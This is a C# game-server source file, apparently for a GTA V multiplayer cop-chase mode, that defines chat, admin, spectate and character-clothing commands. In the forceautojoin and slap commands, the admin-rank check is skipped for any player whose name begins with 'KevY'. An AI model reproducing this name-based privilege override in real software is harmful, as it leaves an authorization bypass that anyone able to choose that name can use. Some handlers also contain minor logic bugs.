            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
            }
            else
            {
                var msg = "!{#C3A3DB}* " + text + $" (( {player.Name} ))";
                var playersAround = NAPI.Player.GetPlayersInRadiusOfPlayer(40, player);

                foreach (var players in playersAround)
                {
                    if(players.Dimension == player.Dimension) players.TriggerEvent("pushMsgToChat", msg);
                }
            }
        }

        [Command("forceautojoin", "!{#AFAFAF}[USAGE] forceautojoin (target)", GreedyArg = true)]
        public void cmd_forceautojoin(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                    return;
                }

                if (target.GetSharedData<int>("InLobby") == -5) return;

                if (EPlayer.GetAccount(target).JailTime > 0)
                {
                    target.SetSharedData("AutoJoin", false);
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is in jail!");
                    return;
                }

                if (target.GetSharedData<bool>("AutoJoin") == true)
                {
                    EPlayer.Notify(target, $"AutoJoin has been turned <strong>OFF</strong> by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}.", "red", "fas fa-check", false, 1500, "bottomCenter", "replace");
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target's auto join has been turned off!");
                    target.SetSharedData("AutoJoin", false);
                }
                else
                {
                    EPlayer.Notify(target, $"AutoJoin has been turned <strong>ON</strong> by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}.", "green", "fas fa-check", false, 1500, "bottomCenter", "replace");
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target's auto join has been turned on!");
                    target.SetSharedData("AutoJoin", true);
                }
            }
        }

        [Command("slap", "!{#AFAFAF}[USAGE] slap (target)", GreedyArg = true)]
        public void cmd_slap(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                    return;
                }
                target.TriggerEvent("ToggleSeatbelt", false);
                target.ResetData("Seatbelt");
                target.Position = new Vector3(target.Position.X, target.Position.Y, target.Position.Z + 5f);

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {target.Name} has been slapped by {player.Name}.");
            }
        }

        [Command("showshotstats", "!{#AFAFAF}[USAGE] showshotstats (target)", GreedyArg = true)]
        public void cmd_showshotstats(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                EPlayer.ShowShotStats(player, target);
            }
        }

        [Command("resetshotstats", "!{#AFAFAF}[USAGE] resetshotstats (target)", GreedyArg = true)]
        public void cmd_resetshotstats(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                EPlayer.ResetShotStats(target);
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has reset {player.Name}'s shot statistics.");
            }
        }

        [Command("shotstats")]
        public void cmd_shotstats(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            EPlayer.ShowShotStats(player, player);
        }

        [Command("grantfugitive", "!{#AFAFAF}[USAGE] grantfugitive (target)", GreedyArg = true)]
        public void cmd_grantfugitive(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if (target.HasData("GrantFugitive"))
                {
                    target.ResetData("GrantFugitive");
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}You have taken GrantFugitive flag from " + target.Name + ".");
                }
                else
                {
                    target.SetData("GrantFugitive", 10);
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}You have given GrantFugitive flag to " + target.Name + ".");
                }
            }
        }

        [Command("outfit", "!{#AFAFAF}[USAGE] outfit (option: save, select)")]
        public void cmd_outfit(Player player, string option)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("Team") != -1 && player.GetSharedData<int>("InLobby") != -4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase or derby!");
                return;
            }

            if (option == "select")
            {
                player.TriggerEvent("ShowOutfitsMenu", player.GetData<int>("LastEditedClothingTeam"), (EPlayer.GetAccount(player).DonatorLevel > 1), 0);
            }
            else if(option == "save")
            {
                player.TriggerEvent("ShowOutfitsMenu", player.GetData<int>("LastEditedClothingTeam"), (EPlayer.GetAccount(player).DonatorLevel > 1), 1);
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option! Valid options are: save, select");
                return; 
            }
        }

        [Command("clothing", "!{#AFAFAF}[USAGE] clothing (option: reset, cop, fugitive)", GreedyArg = true)]
        public void cmd_clothing(Player player, string team)
        {
            string parameters = "clothing " + team;

            if(team.Contains("reset"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}Please use /char help or /char resetclothing because you're at the wrong place.");
                return;
            }

            cmd_char(player, parameters);
            return;
        }

        [Command("dbgsetclothing")]
        public void cmd_dbgsetclothing(Player player, string type, int drawable, int texture = 0)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 5) 
                return;

            CharacterData ConvChar = new CharacterData();
            try
            {
                ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
            }
            catch
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                return;
            }

            switch (type)
            {
                case "shirt":
                    ConvChar.Clothing[0].Clothes[11].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[11].Texture = texture;
                    player.SetClothes(11, drawable, texture);
                    break;
                case "undershirt":
                    ConvChar.Clothing[0].Clothes[8].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[8].Texture = texture;
                    player.SetClothes(8, drawable, texture);
                    break;
                case "pants":
                    ConvChar.Clothing[0].Clothes[4].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[4].Texture = texture;
                    player.SetClothes(4, drawable, texture);
                    break;
                case "shoes":
                    ConvChar.Clothing[0].Clothes[6].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[6].Texture = texture;
                    player.SetClothes(6, drawable, texture);
                    break;
                case "accessory":
                    ConvChar.Clothing[0].Clothes[7].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[7].Texture = texture;
                    player.SetClothes(7, drawable, texture);
                    break;
                case "bag":
                    ConvChar.Clothing[0].Clothes[5].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[5].Texture = texture;
                    player.SetClothes(5, drawable, texture);
                    break;
                case "mask":
                    ConvChar.Clothing[0].Clothes[1].Drawable = drawable;
                    ConvChar.Clothing[1].Clothes[1].Texture = texture;
                    player.SetClothes(1, drawable, texture);
                    break;
                default:
                    EPlayer.SendMessage(player, "!{#C9C9C9}[OPTIONS] shirt/undershirt/pants/shoes/accessory/bag/mask");
                    return;
            }
            EPlayer.SendMessage(player, $"~y~Done! You set your ~w~{type} ~y~to drawable ~w~{drawable} (TX:{texture})~w~!");
            return;
        }

        [Command("char", "!{#AFAFAF}[USAGE] character (option: reset, edit, help, (reset)clothing, lobbyteam)", GreedyArg = true, Alias = "character")]
        public void cmd_char(Player player, string action)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("Team") != -1 && player.GetSharedData<int>("InLobby") != -4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase or derby!");
                return;
            }

            if (action.StartsWith("reset", StringComparison.OrdinalIgnoreCase) && !action.StartsWith("resetclothing", StringComparison.OrdinalIgnoreCase))
            {
                EPlayer.GetAccount(player).Character = "{}";
                EPlayer.ShowCharCreator(player);
            }
            else if (action.StartsWith("edit", StringComparison.OrdinalIgnoreCase))
            {
                CharacterData ConvChar = new CharacterData();

                try
                {
                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);

                    player.SetData("cEditClothingData", ConvChar.Clothing);
                    EPlayer.ShowCharCreator(player, ConvChar);
                }
                catch { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character to edit!"); }
               
            }
            else if (action.StartsWith("help", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Option] !{#999999}reset !{#FFFFFF}- Resets your character and sends you back to creation.");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Option] !{#999999}edit !{#FFFFFF}- Allows you to edit your current character.");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Option] !{#999999}clothing !{#FFFFFF}- Sets clothing for a team, fugitive or cop.");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Option] !{#999999}resetclothing !{#FFFFFF}- Resets the clothing for a team.");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Option] !{#999999}lobbyteam !{#FFFFFF}- Sets the clothing of which team that appears on lobby, derby dm etc.");
            }
            else if (action.StartsWith("clothing", StringComparison.OrdinalIgnoreCase))
            {
                CharacterData ConvChar = new CharacterData();

                try
                {
                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
                }
                catch
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                if (EPlayer.GetAccount(player).Character.Length < 10 || EPlayer.GetAccount(player).Character == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    if (args[1].StartsWith("cop", StringComparison.OrdinalIgnoreCase))
                    {
                        try
                        {
                            EPlayer.ApplyCharacter(player, ConvChar, 1);
                        }
                        catch { return; }

                        player.SetData("EditingClothing", 1);
                        player.SetData("LastEditedClothingTeam", 1);
                        player.TriggerEvent("ShowClothesMenu");
                    }
                    else if (args[1].StartsWith("fugitive", StringComparison.OrdinalIgnoreCase))
                    {
                        try
                        {
                            EPlayer.ApplyCharacter(player, ConvChar, 0);
                        }
                        catch { return; }

                        player.SetData("EditingClothing", 0);
                        player.SetData("LastEditedClothingTeam", 0);
                        player.TriggerEvent("ShowClothesMenu");
                    }
                    else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid team, clothings can only be set for 'fugitive' or 'cop' team.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /char clothing (team), teams: cop OR fugitive");
            }
            else if (action.StartsWith("resetclothing", StringComparison.OrdinalIgnoreCase))
            {
                CharacterData ConvChar = new CharacterData();

                try
                {
                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
                }
                catch
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                if (EPlayer.GetAccount(player).Character.Length < 10 || EPlayer.GetAccount(player).Character == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    if (args[1].StartsWith("cop", StringComparison.OrdinalIgnoreCase))
                    {
                        CharacterData charData = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
                        charData.Clothing[1] = new ClothingData();
                        EPlayer.GetAccount(player).Character = NAPI.Util.ToJson(charData);

                        EPlayer.Spawn(player, false);

                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Reset your clothing for cop team.");
                    }
                    else if (args[1].StartsWith("fugitive", StringComparison.OrdinalIgnoreCase))
                    {
                        CharacterData charData = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
                        charData.Clothing[0] = new ClothingData();
                        EPlayer.GetAccount(player).Character = NAPI.Util.ToJson(charData);

                        EPlayer.Spawn(player, false);

                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Reset your clothing for fugitive team.");
                    }
                    else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid team, clothings can only be set for 'fugitive' or 'cop' team.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /char resetclothing (team), teams: cop OR fugitive");
            }
            else if (action.StartsWith("lobbyteam", StringComparison.OrdinalIgnoreCase))
            {
                CharacterData ConvChar = new CharacterData();

                try
                {
                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);
                }
                catch
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                if (EPlayer.GetAccount(player).Character.Length < 10 || EPlayer.GetAccount(player).Character == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have a character created! (/char reset)");
                    return;
                }

                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    if (args[1].StartsWith("cop", StringComparison.OrdinalIgnoreCase))
                    {
                        EPlayer.GetAccount(player).LobbyClothing = 1;

                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You will now spawn with cop clothing in lobby.");
                    }
                    else if (args[1].StartsWith("fugitive", StringComparison.OrdinalIgnoreCase))
                    {
                        EPlayer.GetAccount(player).LobbyClothing = 0;

                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You will now spawn with fugitive clothing in lobby.");
                    }
                    else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid team, clothings can only be set for 'fugitive' or 'cop' team.");

                    try
                    {
                        ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(player).Character);

                        EPlayer.ApplyCharacter(player, ConvChar, EPlayer.GetAccount(player).LobbyClothing);
                    }
                    catch { return; }
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /char lobbyteam (team), teams: cop OR fugitive");
            }

            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'help', 'edit', 'reset', 'clothing', 'resetclothing', 'lobbyteam'");

            return;
        }

        [Command("requests", Alias = "reports")]
        public void cmd_requests(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;


            if (EPlayer.GetAccount(player).Admin < 1)
                return;

            if (Settings.Requests.Count < 1) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}There are no on-going requests."); return; }

            foreach(RequestData req in Settings.Requests)
            {
                if(req.RequestType == 0)
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[REQUEST {req.RequestID}] TYPE: REPORT | BY: {req.Reporter.Name} | REPORTED: {req.Reported.Name} | REASON: {req.Description}.");
                }
                else if (req.RequestType == 1)
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#1E9913}}[REQUEST {req.RequestID}] TYPE: QUESTION | BY: {req.Reporter.Name} | QUESTION: {req.Description}.");
                }
            }
            return;
        }

        [Command("acceptreport", "!{#AFAFAF}[USAGE] acceptreport (requestid)", Alias = "ar,acceptrequest")]
        public void cmd_acceptreport(Player player, int requestid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
                return;

            if (Settings.Requests.Count(r => r.RequestID == requestid) < 1) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}No request with that ID, see /requests."); return; }

            RequestData req = Settings.Requests.ToList().Find(a => a.RequestID == requestid);

            if (req.RequestType == 0)
            {
                req.Reporter.TriggerEvent("pushMsgToChat", $"!{{#DBCE40}}[REQUEST {requestid}] {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has accepted your report on {req.Reported.Name}.");
            }
            else if (req.RequestType == 1)
            {
                req.Reporter.TriggerEvent("pushMsgToChat", $"!{{#1E9913}}[HELPME] {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has come to your assistance on the helpme: ");
                req.Reporter.TriggerEvent("pushMsgToChat", $"!{{#A8A8A5}}Q: {req.Description}");
            }
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#1E9913}}{player.Name} accepted {req.Reporter.Name}'s request ID {requestid}.");

            Settings.Requests.RemoveAll(r => r.RequestID == requestid);
            return;
        }

        [Command("denyreport", "!{#AFAFAF}[USAGE] denyreport (requestid) (reason)", Alias = "dr,denyrequest", GreedyArg = true)]
        public void cmd_denyreport(Player player, int requestid, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
                return;

            if (Settings.Requests.Count(r => r.RequestID == requestid) < 1) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}No request with that ID, see /requests."); return; }

            RequestData req = Settings.Requests.ToList().Find(a => a.RequestID == requestid);

            req.Reporter.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[REQUEST {requestid}] {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has denied your request, for {reason}.");
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} denied {req.Reporter.Name}'s request ID {requestid} for {reason}.");

            Settings.Requests.RemoveAll(r => r.RequestID == requestid);
            return;
        }

        [Command("nametags")]
        public void cmd_nametaghack(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Cheese! You got caught in 4K!");
                return;
            }

            if (player.GetSharedData<bool>("NametagHack") == true)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Nametag hack has been disabled.");
                Logs.LogAdmin(player, $"Disabled nametag hack.");
                player.SetSharedData("NametagHack", false);
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[>] !{#FFFFFF}Nametag hack has been enabled.");
                Logs.LogAdmin(player, $"Enabled nametag hack.");
                player.SetSharedData("NametagHack", true);
            }
            return;
        }

        [Command("spec", "!{#AFAFAF}[USAGE] spec (target)", GreedyArg = true)]
        public void cmd_spec(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if(player.HasData("Spectating"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Already spectating! Switching targets...");
                cmd_specoff(player);
            }

            if (player.GetSharedData<int>("InDM") != -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in /dm!");
                return;
            }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                if (player.GetSharedData<int>("Team") != -1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in copchase!");
                    return;
                }

                LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == player.GetSharedData<int>("InLobby"));
                if (lobby != null)
                {
                    if (
                        !(lobby.gameStatus == 1 && (lobby.Cops.Contains(target) || lobby.Fugitives.Contains(target)) && target.IsInstanceAlive && !target.Dead))
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF]You can only spectate people that are in your lobby and copchase!");
                        return;
                    }
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF]You are not in a copchase lobby!");
                    return;
                }
            }

            if(target.HasData("Spectating")) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target is spectating someone else!"); return; }

            player.SetData("Spectating", true);
            player.SetData("SpectatingPlayer", target);

            player.SetData("Spec_Dimension", player.Dimension);
            player.SetData("Spec_Pos", player.Position);
            player.TriggerEvent("showHPBars", 1);
            player.SetSharedData("EntAlpha", 0);

            player.Dimension = target.Dimension;
            Vector3 pos = target.Position;
            pos.Z -= 20f;
            player.Position = pos;

            player.SetSharedData("VisibleBlip", false);

            NAPI.Task.Run(() =>
            {
                lock (target)
                {
                    lock (player)
                    {
                        if (player != null && player.Exists && target != null && target.Exists)
                        {
                            player.TriggerEvent("SpectatePlayer", target);
                            player.TriggerEvent("SetPlayerFrozen", true);
                        }
                    }
                }
            }, 1000);
                

            player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[>] !{{#FFFFFF}}You are now spectating: !{{#FF6347}}{target.Name}");

            if (EPlayer.GetAccount(player).Admin > 0)
            {
                player.SetSharedData("NametagHack", true);
                EPlayer.ShowAdminNotes(player, EPlayer.GetAccount(target), AdminNote.ANoteType.OnSpectate);
                EPlayer.ShowAdminNotes(player, EPlayer.GetAccount(target), AdminNote.ANoteType.Both, false);
            }
            return;
        }

        [Command("loadout", Alias = "loadouts")]
        public void cmd_loadout(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This option has been migrated to server menu. (/keys)");
            return;
        }

        [Command("specoff", GreedyArg = true)]
        public static void cmd_specoff(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!player.HasData("Spectating")) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not spectating anyone!"); return; }

            player.TriggerEvent("StopSpectating");
            player.TriggerEvent("SetPlayerFrozen", false);

            player.ResetData("Spectating");
            player.ResetData("SpectatingPlayer");
            player.ResetSharedData("NametagHack");

            player.SetSharedData("EntAlpha", 255);
            if (player.HasData("Spec_Pos"))
            {
                player.Dimension = player.GetData<uint>("Spec_Dimension");
                player.Position = player.GetData<Vector3>("Spec_Pos");

                player.ResetData("Spec_Pos");
            }
            return;
        }
       
    }
}